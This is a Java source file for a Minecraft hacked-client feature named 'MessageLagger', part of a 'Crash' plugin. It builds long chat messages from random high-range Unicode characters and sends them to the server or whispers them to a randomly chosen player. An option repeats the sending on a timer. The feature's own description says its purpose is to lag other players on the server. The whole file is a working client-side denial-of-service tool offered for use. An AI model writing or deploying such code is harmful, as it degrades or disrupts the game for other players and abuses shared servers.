package me.dustin.crash.feature;

import me.dustin.crash.CrashPlugin;
import me.dustin.events.core.EventListener;
import me.dustin.events.core.annotate.EventPointer;
import me.dustin.jex.event.filters.PlayerPacketsFilter;
import me.dustin.jex.event.filters.TickFilter;
import me.dustin.jex.event.misc.EventTick;
import me.dustin.jex.event.player.EventPlayerPackets;
import me.dustin.jex.feature.mod.core.Feature;
import me.dustin.jex.feature.option.annotate.Op;
import me.dustin.jex.feature.option.annotate.OpChild;
import me.dustin.jex.helper.misc.StopWatch;
import me.dustin.jex.helper.misc.Wrapper;
import net.minecraft.client.network.AbstractClientPlayerEntity;
import net.minecraft.entity.player.PlayerEntity;

import java.util.List;
import java.util.Random;

public class MessageLagger extends Feature {

    @Op(name = "Message length", min = 1, max = 1000)
    public int messageLength = 200;
    @Op(name = "Keep Sending")
    public boolean keepSending;
    @OpChild(name = "Delay (MS)", max = 1000, parent = "Keep Sending")
    public int delay = 100;
    @Op(name = "Whisper")
    public boolean whisper;
    @Op(name = "Auto Disable")
    public boolean autoDisable = true;

    private final StopWatch stopWatch = new StopWatch();
    public MessageLagger() {
        super(CrashPlugin.CRASH, "Sends dense messages that lag other players on the server.");
    }

    @Override
    public void onEnable() {
        if (!keepSending && Wrapper.INSTANCE.getWorld() != null && Wrapper.INSTANCE.getLocalPlayer() != null) {
            if (whisper)
                sendLagWhisper();
            else
                sendLagMessage();
            setState(false);
            return;
        }
        stopWatch.reset();
        super.onEnable();
    }

    @EventPointer
    private final EventListener<EventPlayerPackets> eventPlayerPacketsEventListener = new EventListener<>(eventPlayerPackets -> {
        if (stopWatch.hasPassed(delay) && keepSending) {
            if (whisper)
                sendLagWhisper();
            else
                sendLagMessage();
            stopWatch.reset();
        }
    }, new PlayerPacketsFilter(EventPlayerPackets.Mode.PRE));

    @EventPointer
    private final EventListener<EventTick> eventTickEventListener = new EventListener<>(eventTick -> {
        if (Wrapper.INSTANCE.getWorld() == null || Wrapper.INSTANCE.getLocalPlayer() == null && autoDisable)
            setState(false);
    }, new TickFilter(EventTick.Mode.PRE));


    private void sendLagMessage() {
        String message = generateLagMessage();
        Wrapper.INSTANCE.getLocalPlayer().sendChatMessage(message);
    }

    private void sendLagWhisper() {
        List<AbstractClientPlayerEntity> players = Wrapper.INSTANCE.getWorld().getPlayers();
        PlayerEntity player = players.get(new Random().nextInt(players.size()));
        String message = generateLagMessage();

        Wrapper.INSTANCE.getLocalPlayer().sendCommand("msg %s %s".formatted(player.getGameProfile().getName(), message));
    }

    private String generateLagMessage() {
        StringBuilder message = new StringBuilder();
        for (int i = 0; i < messageLength; i++) {
            message.append((char) (Math.floor(Math.random() * 0x1D300) + 0x800));
        }
        return message.toString();
    }
}
